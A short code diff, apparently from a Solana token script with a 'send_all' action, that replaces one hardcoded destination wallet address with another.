@@ -19,7 +19,7 @@ const ACTION = 'send_all';
 const SENDS_IN_ONE_TX = 7;
 // const CLOSES_IN_ONE_TX = 27;
 
-const DESTINATION = new PublicKey('HkGiZyGJt7H4XMpzzaSbsUtHqbypwzfuLeWqjkqpgsF2');
+const DESTINATION = new PublicKey('4444yauc6XPT2TKY1GQkQ88SKeJaSVzH5JkohuHmPJNR');
 
 const tokenProgram = TOKEN_PROGRAM_ID;
 
